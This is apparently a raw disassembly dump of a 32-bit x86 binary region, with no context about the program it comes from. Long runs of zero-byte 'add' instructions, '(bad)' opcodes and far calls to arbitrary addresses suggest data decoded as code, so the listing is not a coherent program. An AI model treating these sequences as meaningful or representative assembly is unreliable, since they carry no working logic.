  41d43d:	inc    eax
  41d43e:	ds push esi
  41d440:	push   ebp
  41d441:	dec    esi
  41d442:	push   ebp
  41d443:	push   ebp
  41d444:	pop    edi
  41d445:	sahf   
  41d446:	add    DWORD PTR [eax],eax
  41d448:	add    BYTE PTR [eax],al
  41d44a:	add    BYTE PTR [eax],al
  41d44c:	add    BYTE PTR [ecx+0xb9a2e24],dl
  41d452:	push   esp
  41d453:	xor    al,0x5d
  41d455:	jb     0x41d493
  41d457:	ds arpl WORD PTR ds:[esi+0x514],ax
  41d45f:	add    BYTE PTR [eax],al
  41d461:	add    BYTE PTR [eax],al
  41d463:	add    BYTE PTR [eax],al
  41d465:	add    BYTE PTR [ecx+0x25441556],bl
  41d46b:	aas    
  41d46c:	push   ebx
  41d46d:	pop    ecx
  41d46e:	sub    BYTE PTR [ebx],bh
  41d470:	(bad)  
  41d471:	ss pop esi
  41d473:	push   edx
  41d474:	es popf 
  41d476:	add    BYTE PTR [eax],al
  41d478:	add    BYTE PTR [eax],al
  41d47a:	add    BYTE PTR [eax],al
  41d47c:	pusha  
  41d47d:	xchg   ecx,eax
  41d47e:	cs jge 0x41d4a2
  41d481:	dec    edi
  41d482:	sub    DWORD PTR [edi],edx
  41d484:	inc    esi
  41d485:	dec    ebp
  41d486:	and    eax,0x90865a40
  41d48b:	jnp    0x41d48f
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	pushf  
  41d498:	ins    DWORD PTR es:[edi],dx
  41d499:	push   ebx
  41d49a:	cmp    eax,0x18532e5a
  41d49f:	push   edi
  41d4a0:	jge    0x41d4c7
  41d4a2:	cmp    edi,DWORD PTR [edx+0x3a]
  41d4a5:	popf   
  41d4a6:	add    DWORD PTR [eax],eax
  41d4a8:	add    BYTE PTR [eax],al
  41d4aa:	add    BYTE PTR [eax],ah
  41d4ac:	nop
  41d4ad:	bound  ecx,QWORD PTR [edi+0x3a3f794f]
  41d4b3:	push   ebp
  41d4b4:	dec    edi
  41d4b5:	pop    ecx
  41d4b6:	pop    ecx
  41d4b7:	pop    esp
  41d4b8:	mov    ebx,DWORD PTR [esi+0x7d]
	...
  41d4c6:	add    BYTE PTR [eax],al
  41d4c8:	call   0x3a60:0x4d634c7c
  41d4cf:	push   ebp
  41d4d0:	xchg   edi,eax
  41d4d1:	aas    
  41d4d2:	bound  edx,QWORD PTR [ecx+0xa084]
  41d4d8:	add    BYTE PTR [eax],al
  41d4da:	and    edi,DWORD PTR [ebp+0x62]
  41d4dd:	cmp    al,0x6
  41d4df:	jo     0x41d473
  41d4e1:	pop    esi
  41d4e2:	pop    ebx
  41d4e3:	jns    0x41d503
  41d4e5:	imul   eax,DWORD PTR [esi+0x1509d9c],0x0
	...
  41d4f7:	add    BYTE PTR [ecx],al
  41d4f9:	cdq    
  41d4fa:	xchg   esi,eax
  41d4fb:	fwait
  41d4fc:	call   0xa09f:0x9d8f9c9b
  41d503:	mov    al,ds:0xa0a0
  41d508:	add    dh,BYTE PTR [eax]
  41d50a:	sahf   
  41d50b:	popf   
  41d50c:	popf   
  41d50d:	popf   
  41d50e:	pushf  
  41d50f:	sahf   
  41d510:	sahf   
  41d511:	sahf   
  41d512:	sahf   
  41d513:	sahf   
  41d514:	pushf  
  41d515:	popf   
  41d516:	fwait
  41d517:	pop    ebp
	...
  41d528:	add    BYTE PTR [eax],al
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	add    DWORD PTR [eax],eax
  41d52e:	add    DWORD PTR [eax],eax
  41d530:	add    DWORD PTR [eax],eax
  41d532:	add    DWORD PTR [eax],eax
  41d534:	add    DWORD PTR [eax],eax
  41d536:	add    DWORD PTR [eax],eax
  41d538:	add    BYTE PTR [eax],al
  41d53a:	add    DWORD PTR [eax],eax
  41d53c:	add    DWORD PTR [eax],eax
  41d53e:	add    DWORD PTR [eax],eax
  41d540:	add    DWORD PTR [eax],eax
  41d542:	add    DWORD PTR [eax],eax
  41d544:	add    DWORD PTR [eax],eax
  41d546:	add    DWORD PTR [eax],eax
	...
  41d5e0:	add    BYTE PTR [edx],al
	...
  41d60e:	add    BYTE PTR [eax],al
  41d610:	add    al,BYTE PTR [eax]
	...
  41d642:	add    BYTE PTR [edx],al
	...
  41d670:	add    BYTE PTR [eax+0x0],al
  41d676:	add    eax,DWORD PTR [edx]
  41d678:	add    BYTE PTR [eax],al
  41d67a:	add    BYTE PTR [eax],al
  41d67c:	add    BYTE PTR [eax],al
  41d67e:	add    BYTE PTR [edx],al
  41d680:	add    BYTE PTR [eax],al
  41d682:	add    BYTE PTR [eax],al
  41d684:	add    BYTE PTR [eax],al
  41d686:	add    BYTE PTR [edx],al
  41d688:	add    BYTE PTR [eax],al
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	add    BYTE PTR [eax],al
  41d68e:	add    BYTE PTR [edx],al
  41d690:	add    BYTE PTR [eax],al
  41d692:	add    BYTE PTR [eax],al
  41d694:	add    BYTE PTR [eax],al
  41d696:	add    BYTE PTR [edx],al
  41d698:	add    BYTE PTR [eax],al
  41d69a:	add    BYTE PTR [eax],al
  41d69c:	add    BYTE PTR [eax],al
  41d69e:	add    BYTE PTR [edx],al
  41d6a0:	add    BYTE PTR [eax],al
  41d6a2:	add    BYTE PTR [eax],al
  41d6a4:	add    BYTE PTR [eax],al
  41d6a6:	add    BYTE PTR [edx],al
  41d6a8:	add    BYTE PTR [eax],al
  41d6aa:	add    BYTE PTR [eax],al
  41d6ac:	add    BYTE PTR [eax],al
  41d6ae:	add    BYTE PTR [edx],al
  41d6b0:	add    BYTE PTR [eax],al
  41d6b2:	add    BYTE PTR [eax],al
  41d6b4:	add    BYTE PTR [eax],al
  41d6b6:	add    BYTE PTR [edx],al
  41d6b8:	add    BYTE PTR [eax],al
  41d6ba:	add    BYTE PTR [eax],al
  41d6bc:	add    BYTE PTR [eax],al
  41d6be:	add    BYTE PTR [edx],al
  41d6c0:	add    BYTE PTR [eax],al
  41d6c2:	add    BYTE PTR [eax],al
  41d6c4:	add    BYTE PTR [eax],al
  41d6c6:	add    BYTE PTR [edx],al
  41d6c8:	add    BYTE PTR [eax],al
  41d6ca:	add    BYTE PTR [eax],al
  41d6cc:	add    BYTE PTR [eax],al
  41d6ce:	add    BYTE PTR [edx],al
  41d6d0:	add    BYTE PTR [eax],al
  41d6d2:	add    BYTE PTR [eax],al
  41d6d4:	add    BYTE PTR [eax],al
  41d6d6:	add    BYTE PTR [edx],al
  41d6d8:	add    BYTE PTR [eax],al
  41d6da:	add    BYTE PTR [eax],al
  41d6dc:	add    BYTE PTR [eax],al
  41d6de:	add    BYTE PTR [edx],al
  41d6e0:	add    BYTE PTR [eax],al
  41d6e2:	add    BYTE PTR [eax],al
  41d6e4:	add    BYTE PTR [eax],al
  41d6e6:	add    BYTE PTR [edx],al
  41d6e8:	add    BYTE PTR [eax],al
  41d6ea:	add    BYTE PTR [eax],al
  41d6ec:	add    BYTE PTR [eax],al
  41d6ee:	add    BYTE PTR [edx],al
  41d6f0:	add    BYTE PTR [eax],al
  41d6f2:	add    BYTE PTR [eax],al
  41d6f4:	add    BYTE PTR [eax],al
  41d6f6:	add    BYTE PTR [edx],al
  41d6f8:	add    BYTE PTR [eax],al
  41d6fa:	add    BYTE PTR [eax],al
  41d6fc:	add    BYTE PTR [eax],al
  41d6fe:	add    BYTE PTR [edx],al
  41d700:	add    BYTE PTR [eax],al
  41d702:	add    BYTE PTR [eax],al
  41d704:	add    BYTE PTR [eax],al
  41d706:	add    BYTE PTR [edx],al
  41d708:	add    BYTE PTR [eax],al
  41d70a:	add    BYTE PTR [eax],al
  41d70c:	add    BYTE PTR [eax],al
  41d70e:	add    BYTE PTR [edx],al
  41d710:	add    BYTE PTR [eax],al
  41d712:	add    BYTE PTR [eax],al
  41d714:	add    BYTE PTR [eax],al
  41d716:	add    BYTE PTR [edx],al
  41d718:	add    BYTE PTR [eax],al
  41d71a:	add    BYTE PTR [eax],al
  41d71c:	add    BYTE PTR [eax],al
  41d71e:	add    BYTE PTR [edx],al
  41d720:	add    BYTE PTR [eax],al
  41d722:	add    BYTE PTR [eax],al
  41d724:	add    BYTE PTR [eax],al
  41d726:	add    BYTE PTR [edx],al
  41d728:	add    BYTE PTR [eax],al
  41d72a:	add    BYTE PTR [eax],al
  41d72c:	add    BYTE PTR [eax],al
  41d72e:	add    BYTE PTR [edx],al
  41d730:	add    BYTE PTR [eax],al
  41d732:	add    BYTE PTR [eax],al
  41d734:	add    BYTE PTR [eax],al
  41d736:	add    BYTE PTR [edx],al
  41d738:	add    BYTE PTR [eax],al
  41d73a:	add    BYTE PTR [eax],al
  41d73c:	add    BYTE PTR [eax],al
  41d73e:	add    BYTE PTR [edx],al
  41d740:	add    BYTE PTR [eax],al
  41d742:	add    BYTE PTR [eax],al
  41d744:	add    BYTE PTR [eax],al
  41d746:	add    BYTE PTR [edx],al
  41d748:	add    BYTE PTR [eax],al
  41d74a:	add    BYTE PTR [eax],al
  41d74c:	add    BYTE PTR [eax],al
  41d74e:	add    BYTE PTR [edx],al
  41d750:	add    BYTE PTR [eax],al
  41d752:	add    BYTE PTR [eax],al
  41d754:	add    BYTE PTR [eax],al
  41d756:	add    BYTE PTR [edx],al
  41d758:	add    BYTE PTR [eax],al
  41d75a:	add    BYTE PTR [eax],al
  41d75c:	add    BYTE PTR [eax],al
  41d75e:	add    BYTE PTR [edx],al
  41d760:	add    BYTE PTR [eax],al
  41d762:	add    BYTE PTR [eax],al
  41d764:	add    BYTE PTR [eax],al
  41d766:	add    BYTE PTR [edx],al
  41d768:	add    BYTE PTR [eax],al
  41d76a:	add    BYTE PTR [eax],al
  41d76c:	add    BYTE PTR [eax],al
  41d76e:	add    BYTE PTR [edx],al
  41d770:	add    BYTE PTR [eax],al
  41d772:	add    BYTE PTR [eax],al
  41d774:	add    BYTE PTR [eax],al
  41d776:	add    BYTE PTR [edx],al
  41d778:	add    BYTE PTR [eax],al
  41d77a:	add    BYTE PTR [eax],al
  41d77c:	add    BYTE PTR [eax],al
  41d77e:	add    BYTE PTR [edx],al
  41d780:	add    BYTE PTR [eax],al
  41d782:	add    BYTE PTR [eax],al
  41d784:	add    BYTE PTR [eax],al
  41d786:	add    BYTE PTR [edx],al
  41d788:	add    BYTE PTR [eax],al
  41d78a:	add    BYTE PTR [eax],al
  41d78c:	add    BYTE PTR [eax],al
  41d78e:	add    BYTE PTR [edx],al
  41d790:	add    BYTE PTR [eax],al
  41d792:	add    BYTE PTR [eax],al
  41d794:	add    BYTE PTR [eax],al
  41d796:	add    BYTE PTR [edx],al
  41d798:	add    BYTE PTR [eax],al
  41d79a:	add    BYTE PTR [eax],al
  41d79c:	add    BYTE PTR [eax],al
  41d79e:	add    BYTE PTR [edx],al
  41d7a0:	add    BYTE PTR [eax],al
  41d7a2:	add    BYTE PTR [eax],al
  41d7a4:	add    BYTE PTR [eax],al
  41d7a6:	add    BYTE PTR [edx],al
  41d7a8:	add    BYTE PTR [eax],al
  41d7aa:	add    BYTE PTR [eax],al
  41d7ac:	add    BYTE PTR [eax],al
  41d7ae:	add    BYTE PTR [edx],al
  41d7b0:	add    BYTE PTR [eax],al
  41d7b2:	add    BYTE PTR [eax],al
  41d7b4:	add    BYTE PTR [eax],al
  41d7b6:	add    BYTE PTR [edx],al
  41d7b8:	add    BYTE PTR [eax],al
  41d7ba:	add    BYTE PTR [eax],al
  41d7bc:	add    BYTE PTR [eax],al
  41d7be:	add    BYTE PTR [edx],al
  41d7c0:	add    BYTE PTR [eax],al
  41d7c2:	add    BYTE PTR [eax],al
  41d7c4:	add    BYTE PTR [eax],al
  41d7c6:	add    BYTE PTR [edx],al
  41d7c8:	add    BYTE PTR [eax],al
  41d7ca:	add    BYTE PTR [eax],al
  41d7cc:	add    BYTE PTR [eax],al
  41d7ce:	add    BYTE PTR [edx],al
  41d7d0:	add    BYTE PTR [eax],al
  41d7d2:	add    BYTE PTR [eax],al
  41d7d4:	add    BYTE PTR [eax],al
  41d7d6:	add    BYTE PTR [edx],al
  41d7d8:	add    BYTE PTR [eax],al
  41d7da:	add    BYTE PTR [eax],al
  41d7dc:	add    BYTE PTR [eax],al
  41d7de:	add    BYTE PTR [edx],al
  41d7e0:	add    BYTE PTR [eax],al
  41d7e2:	add    BYTE PTR [eax],al
  41d7e4:	add    BYTE PTR [eax],al
  41d7e6:	add    BYTE PTR [edx],al
  41d7e8:	add    BYTE PTR [eax+0x0],al
  41d7ee:	add    DWORD PTR [edx],eax
  41d7f0:	add    BYTE PTR [eax],ch
  41d7f2:	add    BYTE PTR [eax],al
  41d7f4:	add    BYTE PTR [eax],ah
  41d7f6:	add    BYTE PTR [eax],al
  41d7f8:	add    BYTE PTR [eax+0x0],al
  41d7fb:	add    BYTE PTR [eax],al
  41d7fd:	add    DWORD PTR [eax],eax
  41d7ff:	or     BYTE PTR [eax],al
  41d801:	add    BYTE PTR [eax],al
  41d803:	add    BYTE PTR [eax],al
  41d805:	add    BYTE PTR [eax+eax*1],0x0
	...
  41d811:	add    BYTE PTR [ecx],al
	...
  41d81b:	add    BYTE PTR [eax],al
  41d81d:	add    al,0x3
  41d81f:	add    BYTE PTR [eax],al
  41d821:	add    al,0x4
  41d823:	add    BYTE PTR [eax],al
  41d825:	add    BYTE PTR [eax],al
  41d827:	add    eax,0x5050500
  41d82c:	add    BYTE PTR [eax],al
  41d82e:	add    BYTE PTR [edx],cl
  41d830:	add    BYTE PTR [edx],al
  41d832:	push   es
  41d833:	or     eax,DWORD PTR [eax]
  41d835:	push   es
  41d836:	add    eax,0x8
  41d83b:	or     eax,0xd080300
  41d840:	add    BYTE PTR [ebx],cl
  41d842:	or     cl,BYTE PTR [ecx]
  41d844:	add    BYTE PTR [eax],cl
  41d846:	or     cl,BYTE PTR [esi]
  41d848:	add    BYTE PTR [eax],al
  41d84a:	add    BYTE PTR [ecx],dl
  41d84c:	add    BYTE PTR [edx],al
  41d84e:	push   es
  41d84f:	adc    DWORD PTR [eax],eax
  41d851:	push   es
  41d852:	push   es
  41d853:	adc    BYTE PTR [eax],al
  41d855:	add    BYTE PTR [eax],al
  41d857:	adc    eax,0x19000000
  41d85c:	add    BYTE PTR [ecx],al
  41d85e:	add    eax,0x1a
  41d863:	sbb    eax,0x20000000
  41d868:	add    BYTE PTR [ebx+eax*1],al
  41d86b:	and    al,BYTE PTR [eax]
  41d86d:	add    DWORD PTR [edx+eiz*1],eax
  41d870:	add    BYTE PTR [eax],al
  41d872:	add    BYTE PTR ds:0x27050100,ah
  41d878:	add    BYTE PTR [eax],al
  41d87a:	add    BYTE PTR [ecx],ch
  41d87c:	add    BYTE PTR [eax],al
  41d87e:	add    BYTE PTR ds:0x31000000,ch
  41d884:	add    BYTE PTR [eax],al
  41d886:	add    BYTE PTR [eax+eax*1],dh
  41d889:	add    BYTE PTR [eax],al
  41d88b:	cmp    DWORD PTR [eax],eax
  41d88d:	add    DWORD PTR [esi],eax
  41d88f:	cmp    BYTE PTR [eax],al
  41d891:	add    BYTE PTR [eax],al
  41d893:	cmp    eax,0x32120f00
  41d898:	add    BYTE PTR ds:0x1c003415,dl
  41d89e:	pop    ss
  41d89f:	xor    eax,DWORD PTR [eax]
  41d8a1:	sbb    DWORD PTR [ecx],ebx
  41d8a3:	xor    eax,0x3f121300
  41d8a8:	add    BYTE PTR [esi],bl
  41d8aa:	sbb    al,0x3a
  41d8ac:	add    BYTE PTR [ecx],bl
  41d8ae:	sbb    DWORD PTR ds:0x3c192100,edi
  41d8b4:	add    BYTE PTR ds:0x2c003f1c,ah
  41d8ba:	push   ds
  41d8bb:	add    BYTE PTR ds:[ecx],ah
  41d8be:	and    DWORD PTR [eax],edi
  41d8c0:	add    BYTE PTR [esi],ch
  41d8c2:	daa    
  41d8c3:	cmp    eax,0x34243200
  41d8c8:	add    BYTE PTR [eax],al
  41d8ca:	add    BYTE PTR [ecx+0x0],al
  41d8cd:	add    BYTE PTR [eax],al
  41d8cf:	inc    ebp
  41d8d0:	add    BYTE PTR [edi],al
  41d8d2:	or     eax,0x46
  41d8d7:	dec    ecx
  41d8d8:	add    BYTE PTR [eax],al
  41d8da:	add    BYTE PTR [esi+0x0],cl
  41d8dd:	pop    ss
  41d8de:	pop    ss
  41d8df:	inc    esi
  41d8e0:	add    BYTE PTR [edx],bl
  41d8e2:	sbb    al,BYTE PTR [ebx+0x0]
  41d8e5:	push   ss
  41d8e6:	sbb    eax,0x4e
  41d8eb:	push   ecx
  41d8ec:	add    BYTE PTR [ebx],al
  41d8ee:	cvtdq2ps xmm0,XMMWORD PTR [eax]
  41d8f1:	or     al,0x16
  41d8f3:	push   edx
  41d8f4:	add    BYTE PTR [edx],dl
  41d8f6:	push   ss
  41d8f7:	push   ebp
  41d8f8:	add    BYTE PTR [edx],dl
  41d8fa:	sbb    dl,BYTE PTR [ecx+0x0]
  41d8fd:	sbb    DWORD PTR [edx],ebx
  41d8ff:	push   ecx
  41d900:	add    BYTE PTR [ecx],ch
  41d902:	sbb    ecx,DWORD PTR [ebx+0x0]
  41d905:	pop    ds
  41d906:	and    cl,BYTE PTR [ebp+0x0]
  41d909:	sub    ah,BYTE PTR [ebx+edx*2]
  41d90c:	add    BYTE PTR ds:0x3005a2c,dh
  41d912:	add    al,0x67
  41d914:	add    BYTE PTR [edi+ecx*1],al
  41d917:	ins    BYTE PTR es:[edi],dx
  41d918:	add    BYTE PTR [esi],cl
  41d91a:	or     eax,0x1e060069
  41d91f:	outs   dx,DWORD PTR ds:[esi]
  41d920:	add    BYTE PTR [ebx],bl
  41d922:	push   ds
  41d923:	pusha  
  41d924:	add    BYTE PTR [ebx],dl
  41d926:	push   ss
  41d927:	push   0x0
  41d929:	sbb    bl,BYTE PTR ds:0x703006f
  41d92f:	js     0x41d931
  41d931:	or     BYTE PTR [esi],cl
  41d933:	jns    0x41d935
  41d935:	or     DWORD PTR ds:0x100a007e,ecx
  41d93b:	jb     0x41d93d
  41d93d:	pop    es
  41d93e:	adc    eax,0x1713007a
  41d943:	jne    0x41d945
  41d945:	push   ss
  41d946:	daa    
  41d947:	jae    0x41d949
  41d949:	daa    
  41d94a:	bound  eax,QWORD PTR es:[eax]
  41d94d:	sub    BYTE PTR [ecx],ch
  41d94f:	js     0x41d951
  41d951:	and    dh,BYTE PTR [eax]
  41d953:	jle    0x41d955
  41d955:	xor    DWORD PTR [ecx],esi
  41d957:	jns    0x41d959
  41d959:	inc    esp
  41d95a:	cmp    al,0x66
  41d95c:	add    BYTE PTR [esi],ah
  41d95e:	push   edi
  41d95f:	pop    edi
  41d960:	add    BYTE PTR [esi+0x4b],al
  41d963:	add    BYTE PTR fs:[ebx+esi*2+0x79],al
  41d968:	add    BYTE PTR ds:0xd008a0b,al
  41d96e:	push   ss
  41d96f:	test   DWORD PTR [eax],eax
  41d971:	push   ss
  41d972:	adc    eax,0x1f120087
  41d977:	add    DWORD PTR [eax],0x1a
  41d97a:	sbb    ecx,DWORD PTR [ebp-0x66f9ff00]
  41d980:	add    BYTE PTR [ebx],al
  41d982:	or     ebx,DWORD PTR [ebx-0x63f0f800]
  41d988:	add    BYTE PTR [edi],al
  41d98a:	adc    BYTE PTR [edi-0x6ae9fc00],dl
  41d990:	add    BYTE PTR [ebx],cl
  41d992:	sbb    al,0x92
  41d994:	add    BYTE PTR [ebx],dl
  41d996:	push   ss
  41d997:	xchg   ebx,eax
  41d998:	add    BYTE PTR [ecx],dl
  41d99a:	pop    ss
  41d99b:	cdq    
  41d99c:	add    BYTE PTR [ecx],dl
  41d99e:	push   ds
  41d99f:	cdq    
  41d9a0:	add    BYTE PTR [ecx],bl
  41d9a2:	sbb    eax,0x17260098
  41d9a7:	add    BYTE PTR [eax],0xe
  41d9aa:	lea    eax,es:[eax]
  41d9ad:	adc    DWORD PTR [edx],esp
  41d9af:	test   DWORD PTR [eax],eax
  41d9b1:	sbb    DWORD PTR [edi],esp
  41d9b3:	add    DWORD PTR [eax],0x1d
  41d9b6:	daa    
  41d9b7:	mov    WORD PTR [eax],es
  41d9b9:	or     al,0x27
  41d9bb:	fwait
  41d9bc:	add    BYTE PTR [esi],dl
  41d9be:	sub    eax,0x34160098
  41d9c3:	xchg   ebx,eax
  41d9c4:	add    BYTE PTR [ecx],ch
  41d9c6:	xor    DWORD PTR [ecx-0x5be3f100],ecx
  41d9cc:	add    BYTE PTR [edx],dl
  41d9ce:	pop    ss
  41d9cf:	lods   al,BYTE PTR ds:[esi]
  41d9d0:	add    BYTE PTR ds:0x800bc0f,al
  41d9d6:	adc    al,0xb0
  41d9d8:	add    BYTE PTR [edi+edx*1],dl
  41d9db:	mov    ah,0x0
  41d9dd:	push   cs
  41d9de:	sub    BYTE PTR [eax+eax*1+0xa2231d],ah
  41d9e5:	pop    ds
  41d9e6:	sub    BYTE PTR [edx-0x52dce300],ah
  41d9ec:	add    BYTE PTR [eax],bl
  41d9ee:	cmp    BYTE PTR [esi-0x4adcf500],ah
  41d9f4:	add    BYTE PTR [ebx+ebp*1],dl
  41d9f7:	mov    bh,0x0
  41d9f9:	adc    eax,0x2800bb38
  41d9fe:	sub    DWORD PTR [ecx-0x58cede00],esp
  41da04:	add    BYTE PTR ds:0x2100bc28,ah
  41da0a:	xor    DWORD PTR [ebx-0x76bdda00],esi
  41da10:	add    BYTE PTR [edi],ah
  41da12:	dec    edx
  41da13:	xchg   esi,eax
  41da14:	add    BYTE PTR [edx+eax*2],dh
  41da17:	lahf   
  41da18:	add    BYTE PTR [edx],bh
  41da1a:	push   ebp
  41da1b:	xchg   edi,eax
  41da1c:	add    BYTE PTR [ebx],bl
  41da1e:	inc    ebp
  41da1f:	stos   BYTE PTR es:[edi],al
  41da20:	add    BYTE PTR [ebx],bl
  41da22:	inc    esp
  41da23:	mov    ah,0x0
  41da25:	xor    BYTE PTR [ecx-0x57],al
  41da28:	add    BYTE PTR ds:0x2500af50,dh
  41da2e:	inc    eax
  41da2f:	mov    ecx,0xb5502600
  41da34:	add    BYTE PTR [ebx*2+0x682700ba],dh
  41da3b:	mov    ch,0x0
  41da3d:	push   esi
  41da3e:	jb     0x41d9e6
  41da40:	add    BYTE PTR [ecx],cl
  41da42:	bswap  edi
  41da44:	add    BYTE PTR ds:0x1000ce17,al
  41da4a:	adc    cl,al
  41da4c:	add    BYTE PTR [eax+ecx*1],al
  41da4f:	fld    DWORD PTR [eax]
  41da51:	or     bl,BYTE PTR [ecx]
  41da53:	fadd   QWORD PTR [eax]
  41da55:	or     ah,BYTE PTR [esi]
  41da57:	enter  0x1300,0x23
  41da5b:	fld    DWORD PTR [eax]
  41da5d:	daa    
  41da5e:	rol    BYTE PTR cs:[eax],0x0
  41da62:	add    bh,bh
  41da64:	add    BYTE PTR [eax],al
  41da66:	sub    bh,bh
  41da68:	add    BYTE PTR [edx],dl
  41da6a:	and    esi,eax
  41da6c:	add    BYTE PTR [eax],al
  41da6e:	xor    edi,edi
  41da70:	add    BYTE PTR [eax],al
  41da72:	aaa    
  41da73:	inc    DWORD PTR [eax]
  41da75:	sbb    edx,DWORD PTR [ecx-0x2d]
  41da78:	add    BYTE PTR [edx],dh
  41da7a:	pop    ebp
  41da7b:	leave  
  41da7c:	add    BYTE PTR [edi],cl
  41da7e:	gs ret 
  41da80:	add    BYTE PTR [edi],ah
  41da82:	outs   dx,BYTE PTR ds:[esi]
  41da83:	rol    BYTE PTR [eax],cl
  41da85:	add    BYTE PTR [ecx-0x1],al
  41da88:	add    BYTE PTR [eax],al
  41da8a:	inc    esi
  41da8b:	inc    DWORD PTR [eax]
  41da8d:	add    BYTE PTR [ebp-0x1],cl
  41da90:	add    BYTE PTR [ebx],bl
  41da92:	inc    esi
  41da93:	cmc    
  41da94:	add    BYTE PTR [esi],ch
  41da96:	jo     0x41da97
  41da98:	add    BYTE PTR [edx+0x4f],al
  41da9b:	xlat   BYTE PTR ds:[ebx]
  41da9c:	add    BYTE PTR ds:0x7b00a98a,dh
  41daa2:	pushf  
  41daa3:	xchg   edx,eax
  41daa4:	add    BYTE PTR [ecx-0x59],ch
  41daa7:	mov    bl,0x0
  41daa9:	cmp    DWORD PTR [ecx-0x5ac0ff35],ecx
  41daaf:	mov    DWORD PTR [eax],0xd0a32d
  41dab5:	cmp    BYTE PTR [eax-0x74e0ff28],dh
  41dabb:	repz add BYTE PTR [ecx],dh
  41dabe:	mov    ecx,?
  41dac0:	add    BYTE PTR [esi-0x72],al
  41dac3:	rol    DWORD PTR [eax],0x42
  41dac6:	xchg   edi,eax
  41dac7:	aam    0x0
  41dac9:	push   ecx
  41daca:	stos   BYTE PTR es:[edi],al
  41dacb:	int    0x0
  41dacd:	dec    ecx
  41dace:	test   eax,0xa95100d5
  41dad3:	rol    BYTE PTR [eax],cl
  41dad5:	inc    edx
  41dad6:	mov    bl,0xd5
  41dad8:	add    BYTE PTR [edi-0x4d],cl
  41dadb:	(bad)  
  41dadc:	add    BYTE PTR [ebp-0x4d],cl
  41dadf:	fiadd  DWORD PTR [eax]
  41dae1:	inc    edx
  41dae2:	mov    esi,0xb94a00dc
  41dae7:	fiadd  DWORD PTR [eax]
  41dae9:	pop    ebx
  41daea:	mov    bh,0xd7
  41daec:	add    BYTE PTR [ecx-0x49],dl
  41daef:	fild   DWORD PTR [eax]
  41daf1:	push   ebx
  41daf2:	mov    ebx,0xbb5800dd
  41daf7:	fild   DWORD PTR [eax]
  41daf9:	pop    edx
  41dafa:	mov    esi,0xbf5e00db
  41daff:	fadd   DWORD PTR [eax]
  41db01:	pop    ecx
  41db02:	mov    edi,0xba6400de
  41db07:	fadd   DWORD PTR [eax]
  41db09:	dec    ebp
  41db0a:	mov    bh,0xe4
  41db0c:	add    BYTE PTR [eax+eax*8-0x25],bl
  41db10:	add    BYTE PTR [ebp-0x40],bl
  41db13:	fld    QWORD PTR [eax]
  41db15:	imul   eax,edx,0xc55f00dc
  41db1b:	loopne 0x41db1d
  41db1d:	(bad)  
  41db1e:	(bad)  
  41db1f:	loope  0x41db21
  41db21:	popa   
  41db22:	enter  0xe2,0x65
  41db26:	retf   
  41db27:	loope  0x41db29
  41db29:	addr16 int3 
  41db2b:	jecxz  0x41db2d
  41db2d:	addr16 int3 
  41db2f:	in     al,0x0
  41db31:	push   0x6100e5cd
  41db36:	(bad)
  41db39:	jno    0x41db04
  41db3b:	in     al,0x0
  41db3d:	outs   dx,BYTE PTR ds:[esi]
  41db3e:	shl    dh,cl
  41db40:	add    BYTE PTR [edi-0x2f],bh
  41db43:	in     eax,0x0
  41db45:	test   BYTE PTR [eax+ebp*4-0x3a527800],ch
  41db4c:	add    BYTE PTR [eax-0x7fff283f],bl
  41db52:	shl    ah,0x0
  41db55:	mov    ebx,ecx
  41db57:	jmp    0x8300:0xf1d59700
  41db5e:	jecxz  0x41db5f
  41db60:	add    BYTE PTR [eax-0x44ff1319],dh
  41db66:	repnz out dx,al
  41db68:	add    BYTE PTR [ebx-0x57ff0813],dh
  41db6e:	icebp  
  41db6f:	inc    DWORD PTR [eax]
  41db71:	shr    ebp,0xf4
  41db74:	add    bl,cl
  41db76:	out    dx,al
  41db77:	test   DWORD PTR [eax],0xf8efc4
  41db7d:	leave  
  41db7e:	out    dx,eax
  41db7f:	stc    
  41db80:	add    bl,al
  41db82:	div    cl
  41db84:	add    bl,cl
  41db86:	lock test DWORD PTR [eax],0xf2f9c3
  41db8d:	into   
  41db8e:	stc    
  41db8f:	hlt    
  41db90:	add    dh,cl
  41db92:	lock stc 
  41db94:	add    ch,dl
  41db96:	cli    
  41db97:	hlt    
  41db98:	add    ah,bl
  41db9a:	cli    
  41db9b:	test   BYTE PTR [eax],0xd2
  41db9e:	icebp  
  41db9f:	stc    
  41dba0:	add    BYTE PTR ds:0x3f005000,ch
  41dba6:	add    BYTE PTR [eax+0x0],dh
  41dba9:	push   edx
  41dbaa:	add    BYTE PTR [eax-0x4fff9d00],dl
  41dbb0:	add    BYTE PTR [esi+0x0],dh
  41dbb3:	iret   
  41dbb4:	add    BYTE PTR [eax-0x66ff1000],cl
  41dbba:	adc    edi,edi
  41dbbc:	add    BYTE PTR [esi-0x4bff00cf],ah
  41dbc2:	push   ecx
  41dbc3:	inc    DWORD PTR [eax]
  41dbc5:	ret    0xff71
  41dbc8:	add    bh,cl
  41dbca:	xchg   ecx,eax
  41dbcb:	inc    DWORD PTR [eax]
  41dbcd:	fdiv   QWORD PTR [ecx-0x2e14ff01]
  41dbd3:	inc    DWORD PTR [eax]
  41dbd5:	(bad)  
  41dbd6:	(bad)  
  41dbd7:	inc    DWORD PTR [eax]
  41dbd9:	add    BYTE PTR [eax],al
  41dbdb:	add    BYTE PTR [eax],al
  41dbdd:	or     BYTE PTR [eax],al
  41dbdf:	das    
  41dbe0:	add    BYTE PTR [esi],cl
  41dbe2:	add    BYTE PTR [eax+0x0],dl
  41dbe5:	adc    eax,0x1b007000
  41dbea:	add    BYTE PTR [eax-0x4fffdf00],dl
  41dbf0:	add    BYTE PTR [esi],ah
  41dbf2:	add    bh,cl
  41dbf4:	add    BYTE PTR [eax+eax*1],ch
  41dbf7:	lock add BYTE PTR [esi],bh
  41dbfa:	adc    edi,edi
  41dbfc:	add    BYTE PTR [eax+0x31],bl
  41dbff:	inc    DWORD PTR [eax]
  41dc01:	jno    0x41dc54
  41dc03:	inc    DWORD PTR [eax]
  41dc05:	mov    WORD PTR [ecx-0x1],?
  41dc08:	add    BYTE PTR [esi-0x40ff006f],ah
  41dc0e:	mov    cl,0xff
  41dc10:	add    dl,bl
  41dc12:	sar    edi,1
  41dc14:	add    bh,bh
  41dc16:	(bad)  
  41dc17:	inc    DWORD PTR [eax]
  41dc19:	add    BYTE PTR [eax],bl
  41dc1b:	sbb    BYTE PTR [eax],bl
